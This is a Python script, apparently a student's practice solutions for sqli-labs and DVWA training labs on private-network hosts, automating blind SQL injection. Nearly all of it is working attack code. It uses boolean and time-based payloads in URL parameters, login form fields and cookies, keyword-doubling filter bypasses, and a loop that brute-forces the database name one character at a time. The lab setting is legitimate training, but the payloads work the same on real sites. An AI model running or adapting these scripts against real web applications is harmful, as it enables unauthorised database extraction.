import time

import requests
#第七关
# url='http://192.168.50.133:81/sqli-labs-master/Less-7/?id=1' #要注入的页面
# correct_res=requests.post(url).text
# count=0
# for i in range(33):
#     res=requests.post(url+f"?id=6')) and length(database())={i}--+").text
#     if res==correct_res:
#         count=i
#         break
# str=''
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url+f"?id=6')) and substr(database(),{i},1)='{a}'--+").text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#第八关
# url='http://192.168.50.133:81/sqli-labs-master/Less-9/?id=1' #要注入的页面
# correct_res=requests.post(url).text
# count=0
# for i in range(33):
#     res=requests.post(url+f"?id=1' and length(database())={i}--+").text
#     if res==correct_res:
#         count=i
#         break
# str=''
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url+f"?id=1' and substr(database(),{i},1)='{a}'--+").text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#第九关，看似回显相同，其实正确与错误返回的内容不完全相同
# url='http://192.168.50.133:81/sqli-labs-master/Less-9/?id=1' #要注入的页面
# correct_res=requests.post(url).text
# count=0
# for i in range(33):
#     res=requests.post(url+f"?id=1' and length(database())={i}--+").text
#     if res==correct_res:
#         count=i
#         break
# str=''
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url+f"?id=1' and substr(database(),{i},1)='{a}'--+").text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#第10关，看似回显相同，其实正确与错误返回的内容不完全相同（看源代码可以发现）
# url='http://192.168.50.133:81/sqli-labs-master/Less-10/?id=1' #要注入的页面
# error_url='http://192.168.50.133:81/sqli-labs-master/Less-10/?id=-1'
# correct_res=requests.post(url).text
# error_res=requests.post(error_url).text
# if correct_res!=error_res:
#     print('-'*30,'有布尔盲注漏洞','-'*30)
# count=0;str=''
# for i in range(33):
#     res=requests.post(url+f"""?id=1'" and length(database())={i}--+""").text
#     if res==correct_res:
#         count=i
#         break
#
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url+f"""?id=1'" and substr(database(),{i},1)='{a}'--+""").text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#第15关
# url='http://192.168.50.133:81/sqli-labs-master/Less-15/' #要注入的页面
# correct_res=requests.post(url,{'uname':"' or 1=1 -- ",'passwd':''}).text
# error_res=requests.post(url,{'uname':"' or 1=2 -- ",'passwd':''}).text
# # print(correct_res)
# # print(error_res)
# if correct_res!=error_res:
#     print('-'*30,'有布尔盲注漏洞','-'*30)
# count=0;str=''
# for i in range(33):
#     res=requests.post(url,{'uname':f"' or length(database())={i} -- ",'passwd':''}).text
#     if res==correct_res:
#         count=i
#         break
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url,{'uname':f"' or substr(database(),{i},1)='{a}' -- ",'passwd':''}).text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#第16关
# url='http://192.168.50.133:81/sqli-labs-master/Less-16/' #要注入的页面
# start=time.time()
# correct_res=requests.post(url,{'uname':'") or if(1=1,sleep(0.1),1) -- ','passwd':'")'}).text
# end=time.time()
# print(end-start)
# if end-start>1:
#     print(print('-'*30,'有时间盲注漏洞','-'*30))
# count=0;str=''
# for i in range(33):
#     start=time.time()
#     res=requests.post(url,{'uname':f'''") or if(length(database())={i},sleep(0.1),1) -- ''','passwd':'")'}).text
#     end = time.time()
#     if end-start>1:
#         count=i
#         break
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         start = time.time()
#         resp=requests.post(url,{'uname':f'''") or if(substr(database(),{i},1)='{a}',sleep(0.1),1) -- ''','passwd':'")'}).text
#         end = time.time()
#         if end-start>1:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#第25a关
# url='http://192.168.50.133:81/sqli-labs-master/Less-25a' #要注入的页面
# corrent_url='http://192.168.50.133:81/sqli-labs-master/Less-25a/?id=1' #要注入的页面
# error_url='http://192.168.50.133:81/sqli-labs-master/Less-25a/?id=-1'
# correct_res=requests.post(corrent_url).text
# error_res=requests.post(error_url).text
# if correct_res!=error_res:
#     print('-'*30,'有布尔盲注漏洞','-'*30)
# count=0;str=''
# for i in range(33):
#     res=requests.post(url+f"?id=-1 oorr length(database())={i}--+").text
#     if res==correct_res:
#         count=i
#         break
# print(count)
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url+f"?id=1 anandd substr(database(),{i},1)='{a}'--+").text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#第26a关
# url='http://192.168.50.133:81/sqli-labs-master/Less-26a' #要注入的页面
# corrent_url="http://192.168.50.133:81/sqli-labs-master/Less-26a/?id=1')" #要注入的页面
# error_url="http://192.168.50.133:81/sqli-labs-master/Less-26a/?id=1')%26%26('1')=('2"
# correct_res=requests.post(corrent_url).text
# error_res=requests.post(error_url).text
# if correct_res!=error_res:
#     print('-'*30,'有布尔盲注漏洞','-'*30)
# count=0;str=''
# for i in range(33):
#     res=requests.post(url+f"?id=1')%26%26length(database())={i}%26%26('1')=('1").text
#     if res==correct_res:
#         count=i
#         break
# print(count)
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url+f"?id=1')%26%26substr(database(),{i},1)='{a}'%26%26('1')=('1").text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#第26a关
# url='http://192.168.50.133:81/sqli-labs-master/Less-26a' #要注入的页面
# corrent_url='http://192.168.50.133:81/sqli-labs-master/Less-26a/?id=1")' #要注入的页面
# error_url='http://192.168.50.133:81/sqli-labs-master/Less-26a/?id=1")%26%26("1")=("2'
# correct_res=requests.post(corrent_url).text
# error_res=requests.post(error_url).text
# if correct_res!=error_res:
#     print('-'*30,'有布尔盲注漏洞','-'*30)
# count=0;str=''
# for i in range(33):
#     res=requests.post(url+f'?id=1")%26%26length(database())={i}%26%26("1")=("1').text
#     if res==correct_res:
#         count=i
#         break
# print(count)
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url+f"""?id=1')%26%26substr(database(),{i},1)="{a}"%26%26("1")=("1""").text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)


#第48关
# url='http://192.168.50.133:81/sqli-labs-master/Less-48/' #要注入的页面
# start=time.time()
# correct_res=requests.post(url+"?sort=1' and if(1=1,sleep(0.1),1)-- q").text
# end=time.time()
# print(end-start)
# if end-start>1:
#     print(print('-'*30,'有时间盲注漏洞','-'*30))
# count=0;str=''
# for i in range(33):
#     start=time.time()
#     res=requests.post(url+f"?sort=1 and if(length(database())={i},sleep(0.1),1)-- q").text
#     end = time.time()
#     if end-start>1:
#         count=i
#         break
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         start = time.time()
#         resp=requests.post(url+f"?sort=1 and if(substr(database(),{i},1)='{a}',sleep(0.1),1)-- q").text
#         end = time.time()
#         if end-start>1:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#dvwa SQL injection Blind low token一直刷新不中
# import re,json
# ses=requests.session()
# result=ses.get('http://192.168.50.7/DVWA-master/login.php',).text
# token1=re.findall("user_token' value=\'(.*?)\' />",result,re.DOTALL)[0] #获取token
# print(token1)
#
# data={'user':'gordonb','pwd':'123','Login':'Login','user_token':token1}
# resp=ses.post('http://192.168.50.7/DVWA-master/login.php',data=data).text #登陆页面，登录成功拿到session
# token2=re.findall("user_token' value=\'(.*?)\' />",resp,re.DOTALL)[0] #获取token
# print(token2)
#
# #改难度
# digree_res=ses.post('http://192.168.50.7/DVWA-master/security.php').text
# token3=re.findall("user_token' value=\'(.*?)\' />",digree_res,re.DOTALL)[0] #获取token
# print(token3)
# ses.post('http://192.168.50.7/DVWA-master/security.php',{'security':'low','seclev_submit':'Submit','user_token':token1})


# url='http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind' #要注入的页面
# corrent_url="http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind/?id=3'-- q &Submit=Submit#"
# error_url='http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind/?id=-3 &Submit=Submit#'
# correct_res=ses.post(corrent_url).text
#
# error_res=ses.post(error_url).text
# if correct_res!=error_res:
#     print('-'*30,'有布尔盲注漏洞','-'*30)
# count=0;str=''
# for i in range(33):
#     res=ses.post(url+f"?id=3' and length(database())={i}-- q &Submit=Submit#").text
#     # print(len(res))
#     if res==correct_res:
#         count=i
#         break
# print(count)
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=ses.post(url+f"?id=3' substr(database(),{i},1)='{a}'-- q &Submit=Submit#").text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#dvwa SQL injection Blind low
# url = "http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind/"
# headers = {
#     "Cookie": "PHPSESSID=j3aes5l68obs6hlfnj1fm8aon6; security=low"
# }
# corrent_url="http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind/?id=3&Submit=Submit#"
# correct_res=requests.post(url=corrent_url,headers=headers).text
#
# count=0;str=''
# for i in range(33):
#     res=requests.post(url=url+f"?id=3' and length(database())={i}--+&Submit=Submit#",headers=headers).text
#     # print(len(res))
#     if res==correct_res:
#         count=i
#         break
# print(count)
# for i in range(1,count+1):
#     for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
#         resp=requests.post(url=url+f"?id=3' and substr(database(),{i},1)='{a}'--+&Submit=Submit#",headers=headers).text
#         if resp==correct_res:
#             str+=a
#             break
# print('-'*30,str,'-'*30)

#dvwa SQL injection Blind Medium
# url = "http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind/"
# headers = {
#     "Cookie": "PHPSESSID=j3aes5l68obs6hlfnj1fm8aon6; security=medium"
# }
# corrent_url="http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind/"
# correct_res=requests.post(url=corrent_url,headers=headers,data={'id':3,'Submit':'Submit'}).text
#
# count=0;str=''
# for i in range(33):
#     res=requests.post(url=url,headers=headers,data={'id':f'3 and length(database())={i}','Submit':'Submit'}).text
#     # print(len(res))
#     if res==correct_res:
#         count=i
#         break
# print(count)
# for i in range(1,count+1):
#     for a in range(256):
#         resp=requests.post(url=url,headers=headers,data={'id':f'3 and ascii(substr(database(),{i},1))={a}','Submit':'Submit'}).text
#         if resp==correct_res:
#             # print(chr(a))
#             f=chr(a)
#             str+=f
#             break
# print('-'*30,str,'-'*30)

#dvwa SQL injection Blind high
url = "http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind/"
headers = {
    "Cookie": "id=1;PHPSESSID=j3aes5l68obs6hlfnj1fm8aon6; security=high"
}
corrent_url="http://192.168.50.7/DVWA-master/vulnerabilities/sqli_blind/"
correct_res=requests.post(url=corrent_url,headers=headers).text


count=0;str=''
for i in range(33):
    headers = {
        "Cookie": f"id=1' and length(database())={i}-- q;PHPSESSID=j3aes5l68obs6hlfnj1fm8aon6; security=high"
    }
    res=requests.post(url=url,headers=headers).text
    # print(len(res))
    if res==correct_res:
        count=i
        break
print(count)
for i in range(1,count+1):
    for a in 'abcdefghijklmnopqrstuvwxyz0123456789_':
        headers = {
            "Cookie": f"1' and substr(database(),{i},1)='{a}'-- q;PHPSESSID=j3aes5l68obs6hlfnj1fm8aon6; security=high"
        }
        resp=requests.post(url=url,headers=headers).text
        if resp==correct_res:
            # print(chr(a))
            str+=a
            break
print('-'*30,str,'-'*30)

